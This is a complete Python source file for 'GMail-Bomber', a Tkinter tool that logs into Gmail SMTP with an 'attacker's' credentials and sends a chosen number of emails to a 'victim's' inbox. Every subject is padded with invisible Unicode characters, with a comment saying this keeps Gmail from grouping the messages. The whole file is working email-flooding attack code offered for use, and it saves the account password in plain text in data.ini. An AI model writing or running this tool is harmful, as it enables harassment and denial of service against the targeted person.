import binascii
import configparser
from genericpath import exists
import smtplib
from email.message import EmailMessage
from res.icon import runtime_icon
import tkinter as tk
import threading
import tempfile
import os

#
# Constants
#

smtp_server = 'smtp.gmail.com'
port = 587

#
# User interface
#

def create_gui() -> tk.Tk:
    """
    Generate the user interface

    Returns:
        tk.Tk: User interface
    """
    
    # Textfields
    global txt_attacker_name
    global txt_attacker_address
    global txt_attacker_password
    global txt_victim_address
    global txt_email_amount
    global txt_email_subject
    global txt_email_body
    global txt_output
    
    # Initialize window
    root = tk.Tk()
   
    # Set window attributes
    root.geometry('400x400')
    root.resizable(0, 0)
    root.title('GMail-Bomber')
    root.configure(background = 'black')
    root.wm_attributes('-topmost', 1)
    
    # Create window icon
    iconfile = tempfile.NamedTemporaryFile(delete = False)
    iconfile.write(binascii.a2b_hex(runtime_icon.iconhexdata))
    root.iconbitmap(iconfile.name)
    root.protocol('WM_DELETE_WINDOW', lambda args = (root, iconfile.name): on_closing(args[0], args[1]))
    
    # Attacker name section
    lbl_attacker_name = tk.Label(root, text = 'Attacker\'s name: ', bg = 'black', fg = 'white')
    lbl_attacker_name.place(x = 10, y = 15)
    txt_attacker_name = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
    txt_attacker_name.place(x = 140, y = 15)
    
    # Attacker email address section
    lbl_attacker_address = tk.Label(root, text = 'Attacker\'s address: ', bg = 'black', fg = 'white')
    lbl_attacker_address.place(x = 10, y = 40)
    txt_attacker_address = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
    txt_attacker_address.place(x = 140, y = 40)
    
    # Attacker email password section
    lbl_attacker_password = tk.Label(root, text = 'Attacker\'s password: ', bg = 'black', fg = 'white')
    lbl_attacker_password.place(x = 10, y = 65)
    txt_attacker_password = tk.Entry(root, bg = 'black', fg = 'white', width = 41, insertbackground = 'white', show = '*')
    txt_attacker_password.place(x = 140, y = 65)
    
    # Victim email address section
    lbl_victim_address = tk.Label(root, text = 'Victim\'s address: ', bg = 'black', fg = 'white')
    lbl_victim_address.place(x = 10, y = 90)
    txt_victim_address = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
    txt_victim_address.place(x = 140, y = 90)
    
    # Email amount section
    lbl_email_amount = tk.Label(root, text = 'Email amount: ', bg = 'black', fg = 'white')
    lbl_email_amount.place(x = 10, y = 115)
    txt_email_amount = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
    txt_email_amount.place(x = 140, y = 115)
    
    # Email subject section
    lbl_email_subject = tk.Label(root, text = 'Email subject: ', bg = 'black', fg = 'white')
    lbl_email_subject.place(x = 10, y = 140)
    txt_email_subject = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 1, insertbackground = 'white', font = ('Arial', 9))
    txt_email_subject.place(x = 140, y = 140)
    
    # Email body section
    lbl_email_body = tk.Label(root, text = 'Email body: ', bg = 'black', fg = 'white')
    lbl_email_body.place(x = 10, y = 165)
    txt_email_body = tk.Text(root, bg = 'black', fg = 'white', width = 35, height = 5, insertbackground = 'white', font = ('Arial', 9))
    txt_email_body.place(x = 140, y = 165)
    
    # Save data section
    btn_save_fields = tk.Button(root, text = 'Save fields', bg = 'black', fg = 'white', width = 15, command = save_fields)
    btn_save_fields.place(x = 20, y = 270)
    
    # Load data section
    btn_load_fields = tk.Button(root, text = 'Load fields', bg = 'black', fg = 'white', width = 15, command = load_fields)
    btn_load_fields.place(x = 140, y = 270)
    
    # Send emails section
    btn_send_mails = tk.Button(root, text = '>> Send <<', bg = 'black', fg = 'white', width = 15, command = thread_send_emails)
    btn_send_mails.place(x = 260, y = 270)
    
    # Improvised separator
    sep_seperator = tk.Frame(root, bg = 'white', width = 400, height = 1)
    sep_seperator.place(x = 0, y = 305)
    
    # Output window
    txt_output = tk.Text(root, bg = 'black', fg = 'white', width = 65, height = 6, insertbackground = 'white', wrap = 'none', state = 'disabled', font = ('Arial', 8))
    txt_output.place(x = 3, y = 310)
    
    # Text style tags
    txt_output.tag_configure('white', background = 'black', foreground = 'white')
    txt_output.tag_configure('green', background = 'black', foreground = 'green')
    txt_output.tag_configure('yellow', background = 'black', foreground = 'yellow')
    txt_output.tag_configure('red', background = 'black', foreground = 'red')
    
    return root

#
# Helper methods
#

def on_closing(gui: tk.Tk, iconfile_path: str):
    """
    Attempt to delete the temporary icon file and exit

    Args:
        gui (tk.Tk): User interface instance
        iconfile_path (str): Path to the temporary icon file
    """
    
    # Delete icon
    try:
        os.remove(iconfile_path)
    except Exception:
        pass
    
    # Exit
    gui.destroy()
    exit(0)

def save_fields() -> None:
    """
    Save all fields to a configuration file
    """
    
    # Create config
    config = configparser.ConfigParser()
    config['Default'] = {
        'attacker_name': txt_attacker_name.get('1.0', 'end-1c'),
        'attacker_address': txt_attacker_address.get('1.0', 'end-1c'),
        'attacker_password': txt_attacker_password.get(),
        'victim_adress': txt_victim_address.get('1.0', 'end-1c'),
        'email_amount': txt_email_amount.get('1.0', 'end-1c'),
        'email_subject': txt_email_subject.get('1.0', 'end-1c'),
        'email_body': txt_email_body.get('1.0', 'end-1c')
    }
    
    # Save config on disk
    with open('data.ini', 'w+', encoding = 'utf-8') as configfile:
        config.write(configfile)
        
    print_text('> Saved all fields')

def load_fields() -> None:
    """
    Load all fields from the configuration file
    """
    
    # Check if config exists
    if not exists('data.ini'):
        print_text('> There is no data to load', 'yellow')
        return
    
    # Read config
    config = configparser.ConfigParser()
    config.read('data.ini', encoding = 'utf-8')
    
    # Load config
    txt_attacker_name.delete('1.0', 'end')
    txt_attacker_name.insert('end', config['Default']['attacker_name'])
    txt_attacker_address.delete('1.0', 'end')
    txt_attacker_address.insert('end', config['Default']['attacker_address'])
    txt_attacker_password.delete(0, 'end')
    txt_attacker_password.insert(0, config['Default']['attacker_password'])
    txt_victim_address.delete('1.0', 'end')
    txt_victim_address.insert('end', config['Default']['victim_adress'])
    txt_email_amount.delete('1.0', 'end')
    txt_email_amount.insert('end', config['Default']['email_amount'])
    txt_email_subject.delete('1.0', 'end')
    txt_email_subject.insert('end', config['Default']['email_subject'])
    txt_email_body.delete('1.0', 'end')
    txt_email_body.insert('end', config['Default']['email_body'])
        
    print_text('> Loaded all fields')

def print_text(text: str, tag_color: str = 'white') -> None:
    """
    Print text in the output field

    Args:
        text (str): Text to print
        tag_color (str, optional): Text color. Defaults to 'white'.
    """
    
    # Need to set the state to normal again in order to insert text
    txt_output.configure(state = 'normal')
    txt_output.insert('end', text + '\n', tag_color)
    txt_output.configure(state = 'disabled')
    txt_output.see('end')

#
# Main methods
#

message_number = 0
def create_message() -> EmailMessage:
    """
    Create an email with all of the attributes

    Args:
        i (int): Changing variable

    Returns:
        EmailMessage: Packed email
    """
    
    global message_number
    
    # Get user input
    victim_address = txt_victim_address.get('1.0', 'end-1c')
    email_subject = txt_email_subject.get('1.0', 'end-1c')
    email_body = txt_email_body.get('1.0', 'end-1c')
    attacker_name = txt_attacker_name.get('1.0', 'end-1c')
    attacker_address = txt_attacker_address.get('1.0', 'end-1c')
    
    # Create email
    msg = EmailMessage()
    msg['Subject'] = email_subject + (u'\u200e' * message_number) # Add Unicode to the subject so Gmail does not stack the emails, with \u200e being an invisible character >:)
    msg['From'] = f'{attacker_name} <{attacker_address}>'
    msg['To'] = victim_address
    msg.set_content(email_body)
    
    return msg

def server_login() -> smtplib.SMTP:
    """
    Connect to the SMTP server

    Returns:
        smtplib.SMTP: _description_
    """
    
    # Create connection
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.ehlo()
    
    # Get user input
    attacker_address = txt_attacker_address.get('1.0', 'end-1c')
    attacker_password = txt_attacker_password.get()
    
    # Try to login
    try:
        server.login(attacker_address, attacker_password)
    except smtplib.SMTPAuthenticationError:
        return None
    
    return server

is_sending = False
def thread_send_emails() -> None:
    """
    Start the bombing
    """

    # Do nothing if we are already bombing
    global is_sending
    if is_sending:
        print_text('> Wait until the previous emails are sent')
        return
    
    # Send emails
    email_thread = threading.Thread(target = send_emails)
    email_thread.start()
    

def send_emails() -> None:
    """
    Connect to server and send the emails
    """
    global message_number
    global is_sending
    is_sending = True
    
    # Attempt to login
    email_server = server_login()
    if not email_server:
        print_text('> The password doesn\'t match the email or you didn\'t setup your account correctly. \n> Check this video for help: https://youtu.be/g_j6ILT-X0k', 'red')
        return
    
    # Check if user input is a number
    try:
        amount = int(txt_email_amount.get('1.0', 'end-1c'))
    except ValueError:
        print_text('> Please enter a valid email amount', 'yellow')
        return
    
    # Send emails
    for i in range(amount):
        email_message = create_message()
        email_server.send_message(email_message)
        print_text(f'> Sent email number {i + 1}')
        message_number += 1
    
    # Close connection to SMTP
    email_server.quit()
    print_text('> Emails have been sent successfully', 'green')
    is_sending = False

def main() -> None:
    """
    Program entry point
    """
    
    gui = create_gui()
    gui.mainloop()

if __name__ == '__main__':
    main()
